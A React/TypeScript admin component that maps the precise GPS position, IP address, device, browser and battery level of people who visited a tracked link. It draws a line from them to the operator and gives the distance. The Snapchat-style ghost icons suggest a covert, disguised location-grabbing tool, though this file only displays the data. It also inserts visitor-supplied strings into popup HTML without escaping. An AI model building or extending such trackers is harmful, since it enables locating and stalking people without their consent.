// components/admin/LinkDetailMap.tsx
"use client";

import React, { useEffect, useRef, useState } from "react";
import { DeviceInfo } from "@/lib/types";
import {
  getDarkTileLayerConfig, createSnapGhostIcon, createSnapAccuracyCircle,
  createAdminLocationIcon, createAdminAccuracyCircle, calculateDistanceMeters,
  formatDistance, fetchAdminCoordinates,
} from "@/lib/map-utils";
import { Compass } from "lucide-react";
import { useTheme } from "@/hooks/useTheme";

export interface LinkVisitorPin {
  sessionId?: string;
  latitude: number;
  longitude: number;
  accuracy?: number;
  ipAddress?: string;
  deviceInfo?: DeviceInfo | null;
  status?: string;
  timestamp?: string;
}

interface LinkDetailMapProps {
  coordinates: LinkVisitorPin[];
}

export const LinkDetailMap: React.FC<LinkDetailMapProps> = ({ coordinates }) => {
  const mapContainerRef = useRef<HTMLDivElement>(null);
  const mapInstanceRef = useRef<any>(null);
  const layerGroupRef = useRef<any>(null);
  const tileLayerRef = useRef<any>(null);
  const [adminLoc, setAdminLoc] = useState<{ lat: number; lng: number; acc?: number } | null>(null);
  const { theme } = useTheme();

  useEffect(() => {
    fetchAdminCoordinates((coords) => setAdminLoc(coords));
  }, []);

  const renderMarkers = (L: any, map: any, layerGroup: any, items: LinkVisitorPin[], aLoc: typeof adminLoc) => {
    layerGroup.clearLayers();
    if (items.length === 0 && !aLoc) return;

    const bounds: [number, number][] = [];
    const first = items[0] || null;

    if (aLoc) {
      bounds.push([aLoc.lat, aLoc.lng]);
      const aMarker = L.marker([aLoc.lat, aLoc.lng], { icon: createAdminLocationIcon(L, 28) }).addTo(layerGroup);
      if (aLoc.acc) createAdminAccuracyCircle(L, [aLoc.lat, aLoc.lng], aLoc.acc).addTo(layerGroup);
      const dToVisitor = first ? formatDistance(calculateDistanceMeters(aLoc.lat, aLoc.lng, first.latitude, first.longitude)) : null;
      aMarker.bindPopup(`<div style="color:#000;font-size:12px;padding:4px;"><b>📍 Your Location (Admin)</b><br/><span style="color:#555;">Acc: ±${Math.round(aLoc.acc || 0)}m</span>${dToVisitor ? `<br/><b>Distance to Visitor: ${dToVisitor}</b>` : ""}</div>`);

      if (first) {
        L.polyline([[aLoc.lat, aLoc.lng], [first.latitude, first.longitude]], { color: "#1a73e8", weight: 2.5, opacity: 0.85, dashArray: "6, 6" }).addTo(layerGroup);
      }
    }

    items.forEach((c) => {
      const pos: [number, number] = [c.latitude, c.longitude];
      bounds.push(pos);
      const marker = L.marker(pos, { icon: createSnapGhostIcon(L, 38) }).addTo(layerGroup);
      if (c.accuracy) createSnapAccuracyCircle(L, pos, c.accuracy).addTo(layerGroup);

      const gmapsUrl = `https://www.google.com/maps?q=${c.latitude},${c.longitude}`;
      const devStr = [c.deviceInfo?.os, c.deviceInfo?.browser, c.deviceInfo?.battery !== undefined ? `${c.deviceInfo.battery}%` : null].filter(Boolean).join(" • ");
      const distFromAdmin = aLoc ? formatDistance(calculateDistanceMeters(aLoc.lat, aLoc.lng, c.latitude, c.longitude)) : null;

      marker.bindPopup(`
        <div style="color: #000; font-family: -apple-system, BlinkMacSystemFont, sans-serif; font-size: 12px; min-width: 190px;">
          <p style="font-weight: 800; margin: 0 0 3px 0; font-size: 13px;">Visitor Location</p>
          ${c.ipAddress ? `<p style="margin: 0 0 2px 0; color: #333; font-size: 11px;">IP: <b>${c.ipAddress}</b></p>` : ""}
          ${devStr ? `<p style="margin: 0 0 4px 0; color: #555; font-size: 11px;">${devStr}</p>` : ""}
          <p style="margin: 0 0 4px 0; color: #444; font-size: 11px; font-family: monospace;">${c.latitude.toFixed(5)}, ${c.longitude.toFixed(5)}</p>
          ${distFromAdmin ? `<p style="margin: 0 0 4px 0; color: #1a73e8; font-weight: bold; font-size: 11px;">📏 Distance to You: ${distFromAdmin}</p>` : ""}
          <a href="${gmapsUrl}" target="_blank" rel="noopener noreferrer" style="display: inline-block; background-color: #000; color: #FFFC00; text-decoration: none; padding: 5px 12px; border-radius: 9999px; font-weight: bold; font-size: 11px; margin-top: 4px;">Open in Google Maps ↗</a>
        </div>
      `);
    });

    if (bounds.length === 1) map.setView(bounds[0], 15);
    else if (bounds.length > 1) map.fitBounds(bounds, { padding: [40, 40], maxZoom: 16 });
  };

  useEffect(() => {
    let isMounted = true;
    async function init() {
      if (!mapContainerRef.current || mapInstanceRef.current) return;
      const L = (await import("leaflet")).default;
      if (!isMounted || !mapContainerRef.current) return;

      const center: [number, number] = coordinates.length > 0 ? [coordinates[0].latitude, coordinates[0].longitude] : [31.5204, 74.3587];
      const map = L.map(mapContainerRef.current, { zoomControl: false, attributionControl: false }).setView(center, coordinates.length > 0 ? 15 : 12);
      L.control.zoom({ position: "bottomright" }).addTo(map);

      const tileConfig = getDarkTileLayerConfig(theme);
      tileLayerRef.current = L.tileLayer(tileConfig.url, tileConfig.options).addTo(map);
      layerGroupRef.current = L.layerGroup().addTo(map);
      mapInstanceRef.current = map;
      renderMarkers(L, map, layerGroupRef.current, coordinates, adminLoc);
    }
    init();
    return () => {
      isMounted = false;
      if (mapInstanceRef.current) { mapInstanceRef.current.remove(); mapInstanceRef.current = null; }
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => {
    if (tileLayerRef.current) tileLayerRef.current.setUrl(getDarkTileLayerConfig(theme).url);
  }, [theme]);

  useEffect(() => {
    if (!mapInstanceRef.current || !layerGroupRef.current) return;
    import("leaflet").then((mod) => {
      renderMarkers(mod.default, mapInstanceRef.current, layerGroupRef.current, coordinates, adminLoc);
    });
  }, [coordinates, adminLoc]);

  const first = coordinates[0] || null;
  const distBadge = adminLoc && first ? formatDistance(calculateDistanceMeters(adminLoc.lat, adminLoc.lng, first.latitude, first.longitude)) : null;

  return (
    <div className="relative w-full h-80 rounded-3xl overflow-hidden border border-white/10 bg-[#121216] shadow-xl">
      <div ref={mapContainerRef} className="w-full h-full" />
      {distBadge && (
        <div className="absolute top-3 right-3 z-10">
          <button
            onClick={() => {
              if (mapInstanceRef.current && adminLoc && first) {
                mapInstanceRef.current.fitBounds([[adminLoc.lat, adminLoc.lng], [first.latitude, first.longitude]], { padding: [40, 40] });
              }
            }}
            className="py-1 px-3 rounded-xl text-xs font-bold border bg-blue-600/20 hover:bg-blue-600/30 border-blue-500/40 text-blue-300 transition-all shadow-lg flex items-center gap-1.5"
            title="Fit map between your device and visitor"
          >
            <Compass className="w-3.5 h-3.5" />
            Admin ↔ Visitor: {distBadge}
          </button>
        </div>
      )}
    </div>
  );
};
